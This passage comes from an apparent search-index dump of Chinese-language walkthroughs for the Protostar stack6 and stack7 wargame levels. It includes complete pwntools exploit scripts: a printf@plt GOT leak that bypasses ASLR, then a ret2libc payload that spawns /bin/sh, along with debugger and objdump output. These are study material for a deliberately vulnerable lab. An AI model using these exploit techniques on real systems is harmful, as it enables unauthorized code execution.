\u6dfb\u52a0 system \u7684\u53c2\u6570\uff1a\"/bin/sh\" \u5730\u5740\npayload += p32(binsh_addr)\n\n# \u6dfb\u52a0\u6362\u884c\u7b26\npayload += b\"\\n\"\n\n# \u4fdd\u5b58payload\u5230\u6587\u4ef6\uff08\u53ef\u9009\uff0c\u7528\u4e8e\u8c03\u8bd5\uff09\nwith open(\"payload\", \"wb\") as f:\n    f.write(payload)\n\n# \u6267\u884cexploit\ntry:\n    # \u542f\u52a8\u76ee\u6807\u7a0b\u5e8f\n    p = process(\"/opt/protostar/bin/stack6\")\n\n    # \u53d1\u9001payload\n    p.sendline(payload)\n\n    # \u7b49\u5f85\u7a0b\u5e8f\u5904\u7406\u8f93\u5165\n    p.recvuntil(\"got path\")\n\n    # \u5207\u6362\u5230\u4ea4\u4e92\u6a21\u5f0f\uff0c\u83b7\u53d6shell\n    p.interactive()\n\nexcept Exception as e:\n    sys.exit(1)\n</code></pre> </p>"},{"location":"pwn/Protostar_stack6/#2aslr","title":"2\u3001\u5e38\u89c4\u60c5\u51b5\uff08ASLR\u5f00\u542f\uff09","text":"<pre><code>\u2514\u2500$ cat /proc/sys/kernel/randomize_va_space\n2\n</code></pre>"},{"location":"pwn/Protostar_stack6/#libcreadelf-r-stack6-objdump-r-stack6","title":"\u9996\u5148\u9700\u8981\u6cc4\u6f0flibc\u5730\u5740\uff08\u4f7f\u7528readelf -r stack6 \u6216\u8005 objdump -R stack6\uff09","text":""},{"location":"pwn/Protostar_stack6/#libc","title":"\u8f93\u51falibc\u7684\u8def\u5f84","text":"<pre><code>\u2514\u2500$ ldd stack6\n        linux-gate.so.1 (0xf7fb6000)\n        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d54000)\n        /lib/ld-linux.so.2 (0xf7fb8000)\n</code></pre>"},{"location":"pwn/Protostar_stack6/#got-getsgot080496fc","title":"\u8bfb\u53d6GOT\u8868\u4e2d\u7684\u51fd\u6570\u5730\u5740, gets\u7684GOT\u5730\u5740\u4e3a080496fc","text":"<pre><code>\u2514\u2500$ readelf -r stack6\n\nRelocation section '.rel.dyn' at offset 0x2f0 contains 2 entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n080496e8  00000106 R_386_GLOB_DAT    00000000   __gmon_start__\n08049720  00000705 R_386_COPY        08049720   stdout@GLIBC_2.0\n\nRelocation section '.rel.plt' at offset 0x300 contains 6 entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n080496f8  00000107 R_386_JUMP_SLOT   00000000   __gmon_start__\n080496fc  00000207 R_386_JUMP_SLOT   00000000   gets@GLIBC_2.0\n08049700  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0\n08049704  00000407 R_386_JUMP_SLOT   00000000   _exit@GLIBC_2.0\n08049708  00000507 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0\n0804970c  00000607 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0\n\n\u250c\u2500\u2500(kali\u327fkali)-[/opt/protostar/bin]\n\u2514\u2500$ objdump -R stack6\n\nstack6:     file format elf32-i386\n\nDYNAMIC RELOCATION RECORDS\nOFFSET   TYPE              VALUE\n080496e8 R_386_GLOB_DAT    __gmon_start__\n08049720 R_386_COPY        stdout@GLIBC_2.0\n080496f8 R_386_JUMP_SLOT   __gmon_start__\n080496fc R_386_JUMP_SLOT   gets@GLIBC_2.0\n08049700 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0\n08049704 R_386_JUMP_SLOT   _exit@GLIBC_2.0\n08049708 R_386_JUMP_SLOT   fflush@GLIBC_2.0\n0804970c R_386_JUMP_SLOT   printf@GLIBC_2.0\n</code></pre>"},{"location":"pwn/Protostar_stack6/#ps1gotprintf-libc-gets","title":"PS1:\u8bfb\u53d6GOT\u8868\u4e2d\u7684\u51fd\u6570\u5730\u5740\u9009\u62e9\u4f7f\u7528printf \u6cc4\u9732 libc \u4e2dgets \u7684\u5730\u5740","text":"<pre><code>1. **ASLR \u968f\u673a\u5316**\uff1a\u5f53 ASLR \u5f00\u542f\u65f6\uff0clibc \u7684\u57fa\u5730\u5740\u6bcf\u6b21\u8fd0\u884c\u90fd\u4f1a\u53d8\u5316\n2. **GOT \u8868\u7684\u4f5c\u7528**\uff1aGOT\uff08Global Offset Table\uff09\u4e2d\u5b58\u50a8\u7684\u662f\u51fd\u6570\u5728 libc \u4e2d\u7684\u5b9e\u9645\u5730\u5740\n3. **\u4fe1\u606f\u6cc4\u9732**\uff1a\u901a\u8fc7\u8bfb\u53d6 GOT \u8868\u4e2d\u7684\u6761\u76ee\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6 libc \u51fd\u6570\u7684\u5b9e\u9645\u5730\u5740\n</code></pre>"},{"location":"pwn/Protostar_stack6/#ps2","title":"PS2:\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u5740","text":"<pre><code>\u683c\u5f0f\u5b57\u7b26\u4e32\u5730\u5740\u662f\u00a0`printf`\u00a0\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u5b83\u544a\u8bc9\u00a0`printf`\u00a0\u5982\u4f55\u89e3\u91ca\u548c\u683c\u5f0f\u5316\u540e\u7eed\u7684\u53c2\u6570\u3002\u5177\u4f53\u6765\u8bf4\uff1a\n\n### printf \u51fd\u6570\u7684\u5de5\u4f5c\u539f\u7406\n\nint printf(const char *format, ...);\n\n- `format`\u00a0\u53c2\u6570\uff1a\u6307\u5b9a\u8f93\u51fa\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\uff08\u5982 \"%s\", \"%p\", \"%x\" \u7b49\uff09\n\n- `...`\uff1a\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570\uff0c\u6839\u636e\u683c\u5f0f\u5b57\u7b26\u4e32\u8fdb\u884c\u89e3\u91ca\n</code></pre>"},{"location":"pwn/Protostar_stack6/#ps3-s","title":"PS3:\u9700\u8981\u4e00\u4e2a\u5305\u542b\u00a0<code>%s</code>\u00a0\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\uff1a","text":"<pre><code>\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5305\u542b\u683c\u5f0f\u8bf4\u660e\u7b26\uff08\u5982\u00a0`%s`,\u00a0`%x`,\u00a0`%p`\u00a0\u7b49\uff09\u7684\u5b57\u7b26\u4e32\uff0c\u7528\u4e8e\u63a7\u5236\u00a0`printf`\u00a0\u7b49\u51fd\u6570\u7684\u8f93\u51fa\u683c\u5f0f\u3002\u5728\u6f0f\u6d1e\u5229\u7528\u4e2d\uff0c\u6211\u4eec\u901a\u5e38\u9700\u8981\u627e\u5230\u4e00\u4e2a\u5305\u542b\u00a0`%s`\u00a0\u7684\u5b57\u7b26\u4e32\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u7528\u4e8e\u6cc4\u9732\u5185\u5b58\u5185\u5bb9\u3002\n\n1. `%s`\u00a0\u544a\u8bc9\u00a0`printf`\u00a0\u5c06\u4e0b\u4e00\u4e2a\u53c2\u6570\u89e3\u91ca\u4e3a\u5b57\u7b26\u4e32\u6307\u9488\n\n2. `printf`\u00a0\u4f1a\u8bfb\u53d6\u8be5\u6307\u9488\u6307\u5411\u7684\u5185\u5b58\u5185\u5bb9\uff0c\u76f4\u5230\u9047\u5230\u7a7a\u5b57\u8282\n\n3. \u5f53\u6211\u4eec\u4f20\u9012\u00a0`gets`\u00a0\u7684 GOT \u5730\u5740\u65f6\uff0c`printf`\u00a0\u4f1a\u8f93\u51fa\u8be5\u5730\u5740\u5904\u5b58\u50a8\u7684\u503c\uff08\u5373\u00a0`gets`\u00a0\u7684\u5b9e\u9645\u5730\u5740\uff09\n</code></pre> <pre><code>\u5f53\u00a0`printf`\u00a0\u88ab\u8c03\u7528\u65f6\uff1a\n\n1. \u4ece\u6808\u4e0a\u83b7\u53d6\u683c\u5f0f\u5b57\u7b26\u4e32\u5730\u5740\n\n2. \u8bfb\u53d6\u683c\u5f0f\u5b57\u7b26\u4e32\uff08\u5305\u542b\u00a0`%s`\uff09\n\n3. \u4ece\u6808\u4e0a\u83b7\u53d6\u4e0b\u4e00\u4e2a\u53c2\u6570\uff08gets \u7684 GOT \u5730\u5740\uff09\n\n4. \u8bfb\u53d6\u8be5\u5730\u5740\u5904\u7684\u5185\u5bb9\uff08gets \u7684\u5b9e\u9645\u5730\u5740\uff09\n\n5. \u5c06\u5185\u5bb9\u4f5c\u4e3a\u5b57\u7b26\u4e32\u8f93\u51fa\n\n\n### \u4e3a\u4ec0\u4e48\u8fd9\u79cd\u65b9\u5f0f\u6709\u6548\n\n- **GOT \u8868\u53ef\u8bfb**\uff1aGOT \u8868\u5728\u5185\u5b58\u4e2d\u662f\u53ef\u8bfb\u7684\n\n- **\u683c\u5f0f\u5b57\u7b26\u4e32\u53ef\u63a7**\uff1a\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u4e8c\u8fdb\u5236\u4e2d\u5df2\u6709\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\n\n- **\u53c2\u6570\u4f20\u9012**\uff1a\u901a\u8fc7\u63a7\u5236\u6808\uff0c\u6211\u4eec\u53ef\u4ee5\u4f20\u9012\u4efb\u610f\u53c2\u6570\u7ed9\u00a0`printf`\n</code></pre>"},{"location":"pwn/Protostar_stack6/#printfplt-080483c0","title":"\u83b7\u53d6printf@plt\u7684\u5730\u5740, \u4e3a080483c0","text":"<pre><code>\u2514\u2500$ objdump -d stack6 |grep \"printf@plt\"\n080483c0 &lt;printf@plt&gt;:\n 8048492:       e8 29 ff ff ff          call   80483c0 &lt;printf@plt&gt;\n 80484d3:       e8 e8 fe ff ff          call   80483c0 &lt;printf@plt&gt;\n 80484f3:       e8 c8 fe ff ff          call   80483c0 &lt;printf@plt&gt;\n</code></pre>"},{"location":"pwn/Protostar_stack6/#sprintf","title":"\u627e\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u5740\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u201c%s\u201d\u7684\u5b57\u7b26\u4e32\u4f5c\u4e3aprintf\u7684\u683c\u5f0f\u5b57\u7b26\u4e32","text":""},{"location":"pwn/Protostar_stack6/#strings","title":"\u65b9\u6cd5\u4e00\uff08\u4f7f\u7528 strings \u547d\u4ee4\uff09\uff1a","text":"<pre><code>\u2514\u2500$ strings stack6 | grep \"%\"\nbzzzt (%p)\ngot path %s\n</code></pre>"},{"location":"pwn/Protostar_stack6/#objdump-rodata","title":"\u65b9\u6cd5\u4e8c\uff08\u4f7f\u7528\u00a0<code>objdump</code>\u00a0\u67e5\u770b\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684 .rodata\uff08\u53ea\u8bfb\u6570\u636e\uff09\u6bb5\uff09\uff1a","text":"<pre><code>\u2514\u2500$ objdump -s -j .rodata stack6\n\nstack6:     file format elf32-i386\n\nContents of section .rodata:\n 80485c8 03000000 01000200 696e7075 74207061  ........input pa\n 80485d8 74682070 6c656173 653a2000 627a7a7a  th please: .bzzz\n 80485e8 74202825 70290a00 676f7420 70617468  t (%p)..got path\n 80485f8 2025730a 00                           %s..                       \n</code></pre>"},{"location":"pwn/Protostar_stack6/#s80485f8","title":"\u53ef\u4ee5\u770b\u5230%s\u7684\u8d77\u59cb\u5730\u5740\u4e3a80485f8","text":""},{"location":"pwn/Protostar_stack6/#_3","title":"\u622a\u81f3\u76ee\u524d\u4f4d\u7f6e\uff0c\u5404\u4e2a\u5730\u5740\u4fe1\u606f\u5982\u4e0b\uff1a","text":"<pre><code>printf@plt  080483c0 \nmain        080484fa\n%s      80485f8\ngets@GOT    080496fc\n\n- `printf@got` (0804970c) \u662fGOT\u8868\u4e2d\u5b58\u50a8printf\u5b9e\u9645\u5730\u5740\u7684\u4f4d\u7f6e\n- `printf@plt` (080483c0) \u662fPLT\u8868\u4e2d\u7684\u8df3\u8f6c\u4ee3\u7801\uff0c\u7528\u4e8e\u8c03\u7528printf\u51fd\u6570\n- **\u6211\u4eec\u9700\u8981\u7684\u662fprintf@plt\u5730\u5740**\uff0c\u56e0\u4e3a\u6211\u4eec\u8981\u8c03\u7528printf\u51fd\u6570\uff0c\u800c\u4e0d\u662f\u8bfb\u53d6\u5b83\u7684GOT\u8868\u9879\n</code></pre>"},{"location":"pwn/Protostar_stack6/#_4","title":"\u6808\u5e03\u5c40\u5982\u4e0b\uff1a","text":"<pre><code>+------------------+\n|   \u7f13\u51b2\u533a\u586b\u5145     | 80 bytes\n+------------------+\n|   printf@plt     | \u8986\u76d6\u8fd4\u56de\u5730\u5740\n+------------------+\n|   main \u5730\u5740      | printf \u7684\u8fd4\u56de\u5730\u5740\n+------------------+\n|   \u683c\u5f0f\u5b57\u7b26\u4e32\u5730\u5740 | printf \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\n+------------------+\n|   gets GOT \u5730\u5740  | printf \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\n+------------------+\n</code></pre>"},{"location":"pwn/Protostar_stack6/#_5","title":"\u6784\u5efa\u5730\u5740\u6cc4\u6f0f\u811a\u672c","text":"<pre><code>#- printf\u4f1a\u5c06`gets@GOT\u5730\u5740` (080496fc) \u5904\u7684**\u503c**\u4f5c\u4e3a\u5b57\u7b26\u4e32\u6307\u9488\n#- `gets@GOT\u5730\u5740` (080496fc) \u672c\u8eab\u662f\u4e00\u4e2a\u56fa\u5b9a\u5730\u5740\uff08\u5728\u7a0b\u5e8f\u4e2d\u4e0d\u53d8\uff09\n#`gets@GOT\u5730\u5740`\u4e2d**\u5b58\u50a8\u7684\u503c**\u662fgets\u51fd\u6570\u5728libc\u4e2d\u7684\u5b9e\u9645\u5730\u5740\uff08\u53d7ASLR\u5f71\u54cd\u4f1a\u53d8\u5316\uff09\n\n# \u4f7f\u7528 %s \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\nfrom pwn import *\n\ncontext(arch='i386', os='linux')\n\np = process('/opt/protostar/bin/stack6')\n\noffset = 80\nprintf_plt = 0x080483c0\nmain_addr = 0x080484fa\ngets_got = 0x080496fc\n\n# \u7b2c\u4e00\u6b65\uff1a\u6cc4\u9732 gets \u5730\u5740\npayload = b'A' * offset\npayload += p32(printf_plt)      # \u8fd4\u56de\u5230 printf\npayload += p32(main_addr)        # printf \u8fd4\u56de\u540e\u56de\u5230 main\npayload += p32(0x080485f8)       # \u683c\u5f0f\u5b57\u7b26\u4e32 \" %s\\n\"\npayload += p32(gets_got)         # \u8981\u6cc4\u9732\u7684 GOT \u5730\u5740\n\nprint(\"[*] Sending leak payload...\")\np.sendline(payload)\n\n# \u63a5\u6536\u7b2c\u4e00\u6b21\u7684\u8f93\u51fa\np.recvuntil(b\"got path \")\np.recvline()  # \u63a5\u6536\u5305\u542b\u5f88\u591a A \u7684\u90a3\u4e00\u884c\n\n# \u73b0\u5728\u63a5\u6536\u6cc4\u9732\u7684\u5730\u5740\n# \u56e0\u4e3a\u683c\u5f0f\u5b57\u7b26\u4e32\u662f \" %s\\n\"\uff0c\u6240\u4ee5\u4f1a\u5148\u6709\u4e00\u4e2a\u7a7a\u683c\n# **printf\u8f93\u51fa**:\u00a0`\" \\x70\\xf6\\xd5\\xf7\\n\"`\n# - \u7a7a\u683c\uff08\u00a0\uff09\uff1a\u683c\u5f0f\u5b57\u7b26\u4e32\" %s\\n\"\u4e2d\u7684\u7a7a\u683c\n# - 4\u5b57\u8282\u5730\u5740\uff1agets\u7684\u5b9e\u9645\u5730\u5740\uff08\u5982`\\x70\\xf6\\xd5\\xf7`\uff09\np.recv(1)  # \u63a5\u6536\u7a7a\u683c\nleaked_gets = u32(p.recv(4))\nprint(f\"[+] Leaked gets address: {hex(leaked_gets)}\")\n</code></pre> <pre><code># \u8fd9\u4e2a\u662fdebug\u7248\u672c\uff0c\u53ef\u4ee5\u67e5\u770b\u5b8c\u6574\u7684recv\u5185\u5bb9(\u5305\u62echex\u683c\u5f0f)\nfrom pwn import *\n\ncontext(arch='i386', os='linux')\n\np = process('/opt/protostar/bin/stack6')\n\n# \u9996\u5148\u63a5\u6536\u6240\u6709\u521d\u59cb\u8f93\u51fa\u5e76\u6253\u5370\nprint(\"[*] Receiving initial output...\")\ninitial_output = p.recv(timeout=2)\nprint(\"Initial output:\")\nprint(repr(initial_output))\n\noffset = 80\nprintf_plt = 0x080483c0\nmain_addr = 0x080484fa\ngets_got = 0x080496fc\n\n# \u7b2c\u4e00\u6b65\uff1a\u6cc4\u9732 gets \u5730\u5740\npayload = b'A' * offset\npayload += p32(printf_plt)      # \u8fd4\u56de\u5230 printf\npayload += p32(main_addr)        # printf \u8fd4\u56de\u540e\u56de\u5230 main\npayload += p32(0x080485f8)       # \u683c\u5f0f\u5b57\u7b26\u4e32 \" %s\\n\"\npayload += p32(gets_got)         # \u8981\u6cc4\u9732\u7684 GOT \u5730\u5740\n\nprint(\"[*] Sending leak payload...\")\np.sendline(payload)\n\n# \u63a5\u6536\u6240\u6709\u8f93\u51fa\u5185\u5bb9\u5e76\u6253\u5370\nprint(\"[*] Receiving all output after payload...\")\nall_output = p.recv(timeout=2)\nprint(\"\\n[\u5b8c\u6574\u8f93\u51fa\u5185\u5bb9]\")\nprint(repr(all_output))\nprint(\"\\n[\u5341\u516d\u8fdb\u5236\u8f6c\u50a8]\")\nprint(hexdump(all_output))\n\n# \u4ece all_output \u4e2d\u89e3\u6790\u6cc4\u9732\u7684 gets \u5730\u5740\nif b\"got path \" in all_output:\n    # \u627e\u5230 \"got path \" \u7684\u4f4d\u7f6e\n    index = all_output.index(b\"got path \")\n    start_after_got = index + len(b\"got path \")\n    # \u627e\u5230\u4ece start_after_got \u5f00\u59cb\u7684\u7b2c\u4e00\u4e2a\u6362\u884c\u7b26\n    index_nl = all_output.find(b'\\n', start_after_got)\n    if index_nl == -1:\n        print(\"[-] Error: No newline found after 'got path'\")\n        exit(1)\n    # \u68c0\u67e5\u6362\u884c\u7b26\u540e\u7684\u5b57\u8282\u662f\u5426\u662f\u7a7a\u683c\n    if index_nl + 1 &gt;= len(all_output):\n        print(\"[-] Error: Output too short after newline\")\n        exit(1)\n    if all_output[index_nl+1] != ord(' '):\n        print(\"[-] Error: Expected space after newline, but got:\", all_output[index_nl+1])\n        exit(1)\n    # \u63d0\u53d6\u5730\u5740\u5b57\u8282\n    if index_nl + 5 &gt; len(all_output):\n        print(\"[-] Error: Output too short for address\")\n        exit(1)\n    leaked_gets_bytes = all_output[index_nl+2:index_nl+6]\n    leaked_gets = u32(leaked_gets_bytes)\n    print(f\"[+] Leaked gets address: {hex(leaked_gets)}\")\nelse:\n    print(\"[-] Error: 'got path ' not found in output\")\n\"\"\"\n\u4e0b\u9762\u662f\u4e00\u6bb5\u793a\u4f8b\u8fd0\u884c\u8f93\u51fa\uff1a\n\u2514\u2500$ python addr_debug.py\n[+] Starting local process '/opt/protostar/bin/stack6': pid 143257\n[*] Receiving initial output...\nInitial output:\nb'input path please: '\n[*] Sending leak payload...\n[*] Receiving all output after payload...\n\n[\u5b8c\u6574\u8f93\u51fa\u5185\u5bb9]\nb'got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xc0\\x83\\x04\\x08AAAAAAAAAAAA\\xc0\\x83\\x04\\x08\\xfa\\x84\\x04\\x08\\xf8\\x85\\x04\\x08\\xfc\\x96\\x04\\x08\\n p\\xd6\\xd7\\xf7\\ninput path please: '\n\n[\u5341\u516d\u8fdb\u5236\u8f6c\u50a8]\n00000000  67 6f 74 20  70 61 74 68  20 41 41 41  41 41 41 41  \u2502got \u2502path\u2502 AAA\u2502AAAA\u2502\n00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  \u2502AAAA\u2502AAAA\u2502AAAA\u2502AAAA\u2502\n*\n00000040  41 41 41 41  41 41 41 41  41 c0 83 04  08 41 41 41  \u2502AAAA\u2502AAAA\u2502A\u00b7\u00b7\u00b7\u2502\u00b7AAA\u2502\n00000050  41 41 41 41  41 41 41 41  41 c0 83 04  08 fa 84 04  \u2502AAAA\u2502AAAA\u2502A\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\n00000060  08 f8 85 04  08 fc 96 04  08 0a 20 70  d6 d7 f7 0a  \u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7 p\u2502\u00b7\u00b7\u00b7\u00b7\u2502\n00000070  69 6e 70 75  74 20 70 61  74 68 20 70  6c 65 61 73  \u2502inpu\u2502t pa\u2502th p\u2502leas\u2502\n00000080  65 3a 20                                            \u2502e: \u2502\n00000083\n[+] Leaked gets address: 0xf7d7d670\n[*] Stopped process '/opt/protostar/bin/stack6' (pid 143257)\n\n\"\"\"\n</code></pre>"},{"location":"pwn/Protostar_stack6/#exp_1","title":"\u5b8c\u6574\u7684exp\u811a\u672c","text":"<p><pre><code>from pwn import *\n\ncontext(arch='i386', os='linux')\n\np = process('/opt/protostar/bin/stack6')\n\noffset = 80\nprintf_plt = 0x080483c0\nmain_addr = 0x080484fa\ngets_got = 0x080496fc\n\n# \u7b2c\u4e00\u6b65\uff1a\u6cc4\u9732 gets \u5730\u5740\npayload = b'A' * offset\npayload += p32(printf_plt)      # \u8fd4\u56de\u5230 printf\npayload += p32(main_addr)        # printf \u8fd4\u56de\u540e\u56de\u5230 main\npayload += p32(0x080485f8)       # \u683c\u5f0f\u5b57\u7b26\u4e32 \" %s\\n\"\npayload += p32(gets_got)         # \u8981\u6cc4\u9732\u7684 GOT \u5730\u5740\n\nprint(\"[*] Sending leak payload...\")\np.sendline(payload)\n\n# \u63a5\u6536\u7b2c\u4e00\u6b21\u7684\u8f93\u51fa\np.recvuntil(b\"got path \")\np.recvline()  # \u63a5\u6536\u5305\u542b\u5f88\u591a A \u7684\u90a3\u4e00\u884c\n\n# \u73b0\u5728\u63a5\u6536\u6cc4\u9732\u7684\u5730\u5740\n# \u56e0\u4e3a\u683c\u5f0f\u5b57\u7b26\u4e32\u662f \" %s\\n\"\uff0c\u6240\u4ee5\u4f1a\u5148\u6709\u4e00\u4e2a\u7a7a\u683c\n# **printf\u8f93\u51fa**:\u00a0`\" \\x70\\xf6\\xd5\\xf7\\n\"`\n# - \u7a7a\u683c\uff08\u00a0\uff09\uff1a\u683c\u5f0f\u5b57\u7b26\u4e32\" %s\\n\"\u4e2d\u7684\u7a7a\u683c\n# - 4\u5b57\u8282\u5730\u5740\uff1agets\u7684\u5b9e\u9645\u5730\u5740\uff08\u5982`\\x70\\xf6\\xd5\\xf7`\uff09\np.recv(1)  # \u63a5\u6536\u7a7a\u683c\nleaked_gets = u32(p.recv(4))\nprint(f\"[+] Leaked gets address: {hex(leaked_gets)}\")\n# - \u6362\u884c\u7b26\uff08`\\n`\uff09\uff1a\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u7ed3\u5c3e\n\n# \u7b49\u5f85\u4e0b\u4e00\u4e2a\u8f93\u5165\u63d0\u793a\np.recvuntil(b\"input path please: \")\n\n# \u7b2c\u4e8c\u6b65\uff1a\u8ba1\u7b97\u5730\u5740\n# \u4f7f\u7528 pwntools \u81ea\u52a8\u83b7\u53d6\u504f\u79fb\u91cf\nlibc = ELF('/lib/i386-linux-gnu/libc.so.6')\ngets_offset = libc.symbols['gets']\nsystem_offset = libc.symbols['system']\nbinsh_offset = next(libc.search(b'/bin/sh'))\n\nlibc_base = leaked_gets - gets_offset\nsystem_addr = libc_base + system_offset\nbinsh_addr = libc_base + binsh_offset\n\nprint(f\"[+] Libc base: {hex(libc_base)}\")\nprint(f\"[+] System address: {hex(system_addr)}\")\nprint(f\"[+] /bin/sh address: {hex(binsh_addr)}\")\n\n# \u7b2c\u4e09\u6b65\uff1aret2libc\npayload2 = b'A' * offset\npayload2 += p32(system_addr)     # \u8fd4\u56de\u5230 system\npayload2 += p32(0xdeadbeef)      # system \u7684\u8fd4\u56de\u5730\u5740\npayload2 += p32(binsh_addr)      # system \u7684\u53c2\u6570\n\nprint(\"[*] Sending ret2libc payload...\")\np.sendline(payload2)\n\n# \u83b7\u53d6 shell\np.interactive()\n</code></pre> </p>"},{"location":"pwn/Protostar_stack7/","title":"Protostar stack7","text":"<pre><code># Stack Seven\n\nStack6 introduces return to .text to gain code execution.\n\nThe metasploit tool \u201cmsfelfscan\u201d can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.\n\nThis level is at /opt/protostar/bin/stack7\n</code></pre>"},{"location":"pwn/Protostar_stack7/#source-code","title":"Source code","text":"<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nchar *getpath()\n{\n  char buffer[64];\n  unsigned int ret;\n\n  printf(\"input path please: \"); fflush(stdout);\n\n  gets(buffer);\n\n  ret = __builtin_return_address(0);\n\n  if((ret &amp; 0xb0000000) == 0xb0000000) {\n      printf(\"bzzzt (%p)\\n\", ret);\n      _exit(1);\n  }\n\n  printf(\"got path %s\\n\", buffer);\n  return strdup(buffer);\n}\n\nint main(int argc, char **argv)\n{\n  getpath();\n}\n</code></pre> <pre><code>\u2514\u2500$ objdump -t -j .text stack7           \n\nstack7:     file format elf32-i386\n\nSYMBOL TABLE:\n08048410 l    d  .text  00000000              .text\n08048440 l     F .text  00000000              __do_global_dtors_aux\n080484a0 l     F .text  00000000              frame_dummy\n080485d0 l     F .text  00000000              __do_global_ctors_aux\n08048560 g     F .text  00000005              __libc_csu_fini\n08048410 g     F .text  00000000              _start\n08048570 g     F .text  0000005a              __libc_csu_init\n080484c4 g     F .text  00000081              getpath\n080485ca g     F .text  00000000              .hidden __i686.get_pc_thunk.bx\n08048545 g     F .text  0000000f              main\n</code></pre> <p>\u8ba1\u7b97\u504f\u79fb\u91cf(\u53ef\u4ee5\u770b\u5230\u504f\u79fb\u91cf\u4e3a80)</p> <pre><code>\u2514\u2500$ gdb-peda\nSuccessfully imported six module\ngdb-peda$ file stack7\nReading symbols from stack7...\ngdb-peda$ b main\nBreakpoint 1 at 0x804854b: file stack7/stack7.c, line 28.\ngdb-peda$ pattern_create 200\n'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'\ngdb-peda$ run\nStarting program: /opt/protostar/bin/stack7 \n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\nWarning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.\nUse 'set logging enabled off'.\n\nWarning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.\nUse 'set logging enabled on'.\n\n[----------------------------------registers-----------------------------------]\nEAX: 0x8048545 (&lt;main&gt;: push   ebp)\nEBX: 0xf7f95e14 --&gt; 0x232d0c ('\\x0c-#')\nECX: 0x1dedde51 \nEDX: 0xffffcec0 --&gt; 0xf7f95e14 --&gt; 0x232d0c ('\\x0c-#')\nESI: 0x8048570 (&lt;__libc_csu_init&gt;:      push   ebp)\nEDI: 0xf7ffcb60 --&gt; 0x0 \nEBP: 0xffffce98 --&gt; 0x0 \nESP: 0xffffce90 --&gt; 0x0 \nEIP: 0x804854b (&lt;main+6&gt;:       call   0x80484c4 &lt;getpath&gt;)\nEFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8048545 &lt;main&gt;:    push   ebp\n   0x8048546 &lt;main+1&gt;:  mov    ebp,esp\n   0x8048548 &lt;main+3&gt;:  and    esp,0xfffffff0\n=&gt; 0x804854b &lt;main+6&gt;:  call   0x80484c4 &lt;getpath&gt;\n   0x8048550 &lt;main+11&gt;: mov    esp,ebp\n   0x8048552 &lt;main+13&gt;: pop    ebp\n   0x8048553 &lt;main+14&gt;: ret\n   0x8048554:   nop\nGuessed arguments:\narg[0]: 0x0 \n[------------------------------------stack-------------------------------------]\n0000| 0xffffce90 --&gt; 0x0 \n0004| 0xffffce94 --&gt; 0x0 \n0008| 0xffffce98 --&gt; 0x0 \n0012| 0xffffce9c --&gt; 0xf7d87cc3 (&lt;__libc_start_call_main+115&gt;:  add    esp,0x10)\n0016| 0xffffcea0 --&gt; 0x1 \n0020| 0xffffcea4 --&gt; 0xffffcf54 --&gt; 0xffffd147 (\"/opt/protostar/bin/stack7\")\n0024| 0xffffcea8 --&gt; 0xffffcf5c --&gt; 0xffffd161 (\"LESS_TERMCAP_se=\\033[0m\")\n0028| 0xffffceac --&gt; 0xffffcec0 --&gt; 0xf7f95e14 --&gt; 0x232d0c ('\\x0c-#')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, main (argc=0x1, argv=0xffffcf54) at stack7/stack7.c:28\nwarning: 28     stack7/stack7.c: No such file or directory\ngdb-peda$ n\ninput path please: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\ngot path 